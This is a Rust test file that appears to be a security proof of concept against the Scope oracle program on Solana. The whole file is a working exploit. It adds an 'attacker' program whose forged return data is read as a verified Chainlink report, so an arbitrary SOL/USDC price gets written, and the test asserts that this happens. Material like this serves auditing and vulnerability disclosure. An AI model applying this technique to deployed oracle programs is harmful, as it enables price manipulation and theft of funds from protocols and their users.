use std::str::FromStr;

use anchor_lang::{prelude::*, InstructionData, ToAccountMetas};
use num_bigint::BigInt;
use solana_program::{
    instruction::Instruction,
    program::set_return_data,
    pubkey::Pubkey,
    system_program,
};
use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
    account::AccountSharedData,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

// Attacker program: sets return data to whatever bytes are passed in instruction data
fn attacker_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[solana_program::account_info::AccountInfo],
    instruction_data: &[u8],
) -> solana_program::entrypoint::ProgramResult {
    set_return_data(instruction_data);
    Ok(())
}

// Mock Chainlink verifier: accepts any instruction, sets NO return data
fn verifier_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[solana_program::account_info::AccountInfo],
    _instruction_data: &[u8],
) -> solana_program::entrypoint::ProgramResult {
    // Intentionally do nothing and return Ok without setting return data
    Ok(())
}

fn u32_to_4_bytes_le(val: u32) -> [u8; 4] {
    val.to_le_bytes()
}

// Build a realistic Chainlink Streams v3 report bytes using the official crate
fn build_chainlink_v3_report_bytes(
    mapping_pubkey: Pubkey,
    observations_ts: u64,
    price_e18: u128,
    bid_e18: u128,
    ask_e18: u128,
) -> Vec<u8> {
    use chainlink_streams_report::{
        feed_id::ID as FeedID,
        report::v3::ReportDataV3,
    };

    let feed_id = FeedID(mapping_pubkey.to_bytes());
    let price = BigInt::from(price_e18);
    let bid = BigInt::from(bid_e18);
    let ask = BigInt::from(ask_e18);

    let report = ReportDataV3 {
        feed_id,
        observations_timestamp: observations_ts.into(),
        benchmark_price: price,
        bid,
        ask,
        // The remaining fields, if any are present in newer versions of the crate,
        // will use defaults via struct update syntax if optional, otherwise adjust below as needed.
        ..Default::default()
    };

    report.encode()
}

#[tokio::test]
async fn poc_chainlink_return_data_confusion_sets_arbitrary_price() {
    // Program IDs
    let scope_pid = scope::id();
    let verifier_pid = scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_PROGRAM_ID;

    // Attacker program id (arbitrary)
    let attacker_pid = Pubkey::from_str("Attacker1111111111111111111111111111111111").unwrap();

    // Program test with three programs: Scope, Mock Verifier, Attacker
    let mut pt = ProgramTest::new(
        "scope",
        scope_pid,
        processor!(scope::scope::entry),
    );
    pt.add_program("mock_verifier", verifier_pid, verifier_process_instruction);
    pt.add_program("attacker", attacker_pid, attacker_process_instruction);

    // Pre-create all required on-chain accounts
    let mut banks_client = pt.start_with_context().await;
    let payer = &banks_client.payer;
    let recent_blockhash = banks_client.last_blockhash;

    // Create zeroed accounts owned by Scope for initialize()
    use scope::utils::consts::{ORACLE_MAPPING_SIZE, ORACLE_PRICES_SIZE, ORACLE_TWAPS_SIZE, TOKEN_METADATA_SIZE};

    let oracle_mappings_kp = Keypair::new();
    let oracle_prices_kp = Keypair::new();
    let oracle_twaps_kp = Keypair::new();
    let token_metadatas_kp = Keypair::new();

    let rent = banks_client.banks_client.get_rent().await.unwrap();
    let create_zero_account = |space: usize| -> (u64, usize) {
        let space_total = 8 + space; // +8 discriminator
        (rent.minimum_balance(space_total), space_total)
    };

    // OracleMappings
    {
        let (lamports, space) = create_zero_account(ORACLE_MAPPING_SIZE);
        let mut acct = AccountSharedData::new(lamports, space, &scope_pid);
        banks_client.set_account(oracle_mappings_kp.pubkey(), &acct);
    }
    // OraclePrices
    {
        let (lamports, space) = create_zero_account(ORACLE_PRICES_SIZE);
        let mut acct = AccountSharedData::new(lamports, space, &scope_pid);
        banks_client.set_account(oracle_prices_kp.pubkey(), &acct);
    }
    // OracleTwaps
    {
        let (lamports, space) = create_zero_account(ORACLE_TWAPS_SIZE);
        let mut acct = AccountSharedData::new(lamports, space, &scope_pid);
        banks_client.set_account(oracle_twaps_kp.pubkey(), &acct);
    }
    // TokenMetadatas
    {
        let (lamports, space) = create_zero_account(TOKEN_METADATA_SIZE);
        let mut acct = AccountSharedData::new(lamports, space, &scope_pid);
        banks_client.set_account(token_metadatas_kp.pubkey(), &acct);
    }

    // Initialize the Scope accounts
    let feed_name = "TEST".to_string();
    let (config_pda, _bump) = scope::utils::pdas::config_pubkey(&feed_name);

    let init_ix = Instruction {
        program_id: scope_pid,
        accounts: scope::accounts::Initialize {
            admin: payer.pubkey(),
            system_program: system_program::ID,
            configuration: config_pda,
            token_metadatas: token_metadatas_kp.pubkey(),
            oracle_twaps: oracle_twaps_kp.pubkey(),
            oracle_prices: oracle_prices_kp.pubkey(),
            oracle_mappings: oracle_mappings_kp.pubkey(),
        }
        .to_account_metas(None),
        data: scope::instruction::Initialize { feed_name: feed_name.clone() }.data(),
    };

    let mut tx = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
    tx.sign(&[payer], recent_blockhash);
    banks_client.banks_client.process_transaction(tx).await.unwrap();

    // Set mapping for token 0 to Chainlink v3 with realistic generic data (confidence factor = 50 -> 2%)
    let token_index: u16 = 0;
    let mapping_feed_pk = Pubkey::new_unique(); // acts as the Chainlink feed ID for SOL/USDC
    let mut generic_data = [0u8; 20];
    generic_data[..4].copy_from_slice(&u32_to_4_bytes_le(50));

    // Create a dummy account for the price_info mapping with the expected pubkey
    {
        let lamports = rent.minimum_balance(0);
        let acct = AccountSharedData::new(lamports, 0, &system_program::ID);
        banks_client.set_account(mapping_feed_pk, &acct);
    }

    let update_mapping_ix = Instruction {
        program_id: scope_pid,
        accounts: scope::accounts::UpdateOracleMapping {
            admin: payer.pubkey(),
            configuration: config_pda,
            oracle_mappings: oracle_mappings_kp.pubkey(),
            price_info: Some(mapping_feed_pk),
        }
        .to_account_metas(None),
        data: scope::instruction::UpdateMapping {
            token: token_index,
            price_type: scope::oracles::OracleType::Chainlink.into(),
            twap_enabled: false,
            twap_source: 0u16,
            ref_price_index: u16::MAX,
            feed_name: feed_name.clone(),
            generic_data,
        }
        .data(),
    };

    let mut tx = Transaction::new_with_payer(&[update_mapping_ix], Some(&payer.pubkey()));
    tx.sign(&[payer], banks_client.last_blockhash);
    banks_client.banks_client.process_transaction(tx).await.unwrap();

    // Pre-create Verifier config/access controller accounts required by handler's CPI
    let verifier_account = scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_CONFIG_PUBKEY;
    let access_controller = scope::oracles::chainlink::chainlink_streams_itf::ACCESS_CONTROLLER_PUBKEY;
    for (pk, space) in [
        (verifier_account, 0usize),
        (access_controller, 0usize),
    ] {
        if banks_client.banks_client.get_account(pk).await.unwrap().is_none() {
            let lamports = rent.minimum_balance(space);
            let acct = AccountSharedData::new(lamports, space, &system_program::ID);
            banks_client.set_account(pk, &acct);
        }
    }

    // Create a dummy config_account expected by verifier CPI (any account is fine for our mock)
    let config_account_kp = Keypair::new();
    {
        let lamports = rent.minimum_balance(0);
        let acct = AccountSharedData::new(lamports, 0, &system_program::ID);
        banks_client.set_account(config_account_kp.pubkey(), &acct);
    }

    // 1) Instruction 0: attacker sets forged Chainlink return data
    // Forge a SOL/USDC price = 1,000.00 with tiny spread
    let price = 1_000u128 * 10u128.pow(18); // 1000e18
    let bid = 999_900_000_000_000_000_000u128; // 999.9e18
    let ask = 1_000_100_000_000_000_000_000u128; // 1000.1e18

    // observations ts strictly increasing from default (0)
    let obs_ts: u64 = 1_700_000_000;
    let forged_report_bytes = build_chainlink_v3_report_bytes(mapping_feed_pk, obs_ts, price, bid, ask);

    let attacker_ix = Instruction {
        program_id: attacker_pid,
        accounts: vec![],
        data: forged_report_bytes.clone(),
    };

    // 2) Instruction 1: call refresh_chainlink_price with any "legit" serialized report to make verifier CPI succeed
    let serialized_chainlink_report = vec![1u8, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    let refresh_ix = Instruction {
        program_id: scope_pid,
        accounts: scope::accounts::RefreshChainlinkPrice {
            user: payer.pubkey(),
            oracle_prices: oracle_prices_kp.pubkey(),
            oracle_mappings: oracle_mappings_kp.pubkey(),
            oracle_twaps: oracle_twaps_kp.pubkey(),
            verifier_account,
            access_controller,
            config_account: config_account_kp.pubkey(),
            verifier_program_id: verifier_pid,
        }
        .to_account_metas(None),
        data: scope::instruction::RefreshChainlinkPrice {
            token: token_index,
            serialized_chainlink_report,
        }
        .data(),
    };

    let mut tx = Transaction::new_with_payer(&[attacker_ix, refresh_ix], Some(&payer.pubkey()));
    tx.sign(&[payer], banks_client.last_blockhash);
    banks_client.banks_client.process_transaction(tx).await.unwrap();

    // Read back the OraclePrices account and assert the forged price was written
    let acct = banks_client
        .banks_client
        .get_account(oracle_prices_kp.pubkey())
        .await
        .unwrap()
        .expect("oracle_prices must exist");
    let data = acct.data();

    // Offsets inside OraclePrices account:
    // 8 bytes discriminator + 32 bytes oracle_mappings
    let base = 8 + 32;
    let price_value_le = u64::from_le_bytes(data[base..base + 8].try_into().unwrap());
    let price_exp_le = u64::from_le_bytes(data[base + 8..base + 16].try_into().unwrap());

    // Convert our expected Decimal (1000e18) into Price representation used by program (value,exp)
    let expected_decimal = scope::utils::decimal_wad::decimal::Decimal::from(1000u64);
    let expected_price: scope::Price = expected_decimal.into();

    assert_eq!(price_value_le, expected_price.value, "forged price value mismatch");
    assert_eq!(price_exp_le, expected_price.exp, "forged price exp mismatch");
}

